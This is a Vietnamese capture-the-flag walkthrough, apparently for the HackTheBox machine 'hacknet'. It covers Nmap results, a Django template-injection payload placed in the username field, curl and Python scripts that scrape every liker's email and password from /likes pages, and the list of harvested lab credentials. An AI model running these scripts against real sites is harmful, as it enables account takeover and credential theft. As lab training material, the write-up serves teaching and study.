<img width="1416" height="153" alt="image" src="https://github.com/user-attachments/assets/57dd4677-59ff-46c4-9c53-12791b0d29a7" />

Nmap

Starting Nmap 7.94SVN ( <https://nmap.org> ) at 2025-12-10 19:42 CST
Nmap scan report for 10.129.232.4
Host is up (0.31s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 95:62:ef:97:31:82:ff:a1:c6:08:01:8c:6a:0f:dc:1c (ECDSA)
|_  256 5f:bd:93:10:20:70:e6:09:f1:ba:6a:43:58:86:42:66 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Did not follow redirect to <http://hacknet.htb/>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```

### Web Enumeration

**Truy cập web:** vào domain `hacknet.htb`, ta thấy giao diện web

<img width="1312" height="840" alt="image" src="https://github.com/user-attachments/assets/11254176-a956-427f-800b-a4fd4430138b" />

**Web framework:** Django
<img width="1206" height="614" alt="image" src="https://github.com/user-attachments/assets/986ae73f-9456-4f13-86f1-0b51de2b646b" />

**Môi trường**: Web app sử dụng Django.

**Khó khăn**: Django Template Language (DTL) mặc định không cho phép thực thi code Python tùy ý (ví dụ: bạn không thể chạy {{ 7*7 }} hay {{ os.system('id') }} như Jinja2). Nó chỉ cho phép truy xuất các biến (variables) đã được lập trình viên truyền vào context (ngữ cảnh) của trang web. Ý tưởng khai thác: Trang /likes/<post_id> render danh sách người đã like bằng <img title="username">. Nếu username của mình là chuỗi template {{ users.values }}, khi Django render, biến users (QuerySet các user đã like) sẽ được in vào title. Do DTL autoescape, không RCE, nhưng toàn bộ record trong QuerySet (email/username/password/...) lộ ra dưới dạng chuỗi trong title (HTML-escaped). Khi unescape title cuối cùng trong /likes/<id>, sẽ thấy QuerySet chứa dữ liệu nhạy cảm của tất cả user đã like bài đó.

### Đăng nhập và đổi username thành payload

```cookie_file=/tmp/hacknet_cookies

# Lấy CSRF và login
csrf=$(curl -s -H "Host: hacknet.htb" -c "$cookie_file" <http://10.129.232.4/login> \\\\
  | grep -oP 'name="csrfmiddlewaretoken" value="\\\\K[^"]+')
curl -s -H "Host: hacknet.htb" -b "$cookie_file" -c "$cookie_file" \\\\
  -e "<http://hacknet.htb/login>" \\\\
  -d "csrfmiddlewaretoken=$csrf&email=<email>&password=<pass>" \\\\
  <http://10.129.232.4/login> -o /dev/null

# Đổi username thành payload, đổi email để tránh trùng
csrf_edit=$(curl -s -H "Host: hacknet.htb" -b "$cookie_file" <http://10.129.232.4/profile/edit> \\\\
  | grep -oP 'name="csrfmiddlewaretoken" value="\\\\K[^"]+')
curl -s -H "Host: hacknet.htb" -b "$cookie_file" \\\\
  -e "<http://hacknet.htb/profile/edit>" \\\\
  -F "csrfmiddlewaretoken=$csrf_edit" \\\\
  -F "username={{ users.values }}" \\\\
  -F "email=<email_moi>" \\\\
  -F "password=" \\\\
  -F "about=" \\\\
  -F "is_public=on" \\\\
  <http://10.129.232.4/profile/edit> -o /dev/null```

### Trích xuất credentials qua `/likes`

```import re, html, requests
from http.cookiejar import MozillaCookieJar

cookie_path = "/tmp/hacknet_cookies"  # cookie đã login + đổi username payload
base = "<http://10.129.232.4>"
headers = {"Host": "hacknet.htb"}

cj = MozillaCookieJar(cookie_path)
cj.load(ignore_discard=True, ignore_expires=True)
s = requests.Session(); s.cookies = cj

creds = {}
max_posts = 120  # quét nhiều bài

for pid in range(1, max_posts+1):
    s.get(f"{base}/like/{pid}", headers=headers, timeout=5)   # tự like
    r = s.get(f"{base}/likes/{pid}", headers=headers, timeout=5)
    titles = re.findall(r'title="([^"]+)"', r.text)
    if not titles:
        continue
    data = html.unescape(titles[-1])  # title cuối cùng
    if "QuerySet" not in data:
        continue
    emails = re.findall(r"'email': '([^']+)'", data)
    users  = re.findall(r"'username': '([^']+)'", data)
    pwds   = re.findall(r"'password': '([^']+)'", data)
    for e,u,p in zip(emails, users, pwds):
        creds[u] = (e,p)

print("[+] Tổng số cặp:", len(creds))
for u,(e,p) in sorted(creds.items()):
    print(f"{u}:{p} ({e})")```

### Kết quả thu được

```backdoor_bandit : mYd4rks1dEisH3re (mikey@hacknet.htb)
blackhat_wolf   : Bl@ckW0lfH@ck
brute_force     : BrUt3F0rc3#
bytebandit      : Byt3B@nd!t123
codebreaker     : C0d3Br3@k!
cryptoraven     : CrYptoR@ven42
cyberghost      : Gh0stH@cker2024
darkseeker      : D@rkSeek3r#
datadive        : D@taD1v3r
deepdive        : D33pD!v3r
exploit_wizard  : Expl01tW!zard
glitch          : Gl1tchH@ckz
hexhunter       : H3xHunt3r!
netninja        : N3tN1nj@2024
packetpirate    : P@ck3tP!rat3
phreaker        : Phre@k3rH@ck
rootbreaker     : R00tBr3@ker#
shadowcaster    : Sh@d0wC@st!
shadowmancer    : Sh@d0wM@ncer
shadowwalker    : Sh@dowW@lk2024
stealth_hawk    : St3@lthH@wk
trojanhorse     : Tr0j@nH0rse!
virus_viper     : V!rusV!p3r2024
whitehat        : Wh!t3H@t2024
zero_day        : Zer0D@yH@ck
hung            : hung```

### Thử các tài khoản để SSH và tìm user flag
<img width="554" height="81" alt="image" src="https://github.com/user-attachments/assets/a2f68746-e612-4068-a474-6fc6bd5f177d" />
